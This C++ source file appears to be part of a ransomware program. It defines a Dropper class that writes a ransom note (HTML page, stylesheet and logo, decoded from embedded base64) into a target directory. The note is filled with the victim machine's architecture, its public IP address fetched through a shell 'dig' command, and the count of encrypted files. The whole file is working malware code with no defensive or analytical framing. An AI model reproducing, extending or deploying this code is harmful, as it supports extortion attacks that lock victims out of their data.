#include "dropper.h"

extern "C" {
#include <sys/utsname.h>
}
#include <string>
#include <fstream>

#include "note.h"
#include "util.h"

using std::string;
using std::ofstream;
using sys_util::Exec;
using string_util::Replace;
using string_util::Base64Decode;

const string Dropper::kHtmlFilename_ = "index.html";
const string Dropper::kCssFilename_ = "styles.css";
const string Dropper::kLogoFilename_ = "logo.png";

const string Dropper::kSysType_ = "${sys_type}";
const string Dropper::kIp_ = "${ip}";
const string Dropper::kFileCount_ = "${file_count}";

Dropper::Dropper(const string& install_path) {
  install_path_ = (install_path.back() == '/') ? install_path : install_path + '/';
}


void Dropper::DropNote(int encrypted_file_count) const {
  ofstream fout(install_path_ + kHtmlFilename_);
  string html = Base64Decode(note::html);
  utsname uname_buf;
  uname(&uname_buf);
  Replace(html, kSysType_, uname_buf.machine);
  Replace(html, kIp_, Exec("dig +short myip.opendns.com @resolver1.opendns.com"));
  Replace(html, kFileCount_, std::to_string(encrypted_file_count));
  fout << html;
  fout.close();

  fout.open(install_path_ + kCssFilename_);
  fout << Base64Decode(note::css);
  fout.close();

  fout.open(install_path_ + kLogoFilename_);
  fout << Base64Decode(note::logo);
  fout.close();
}
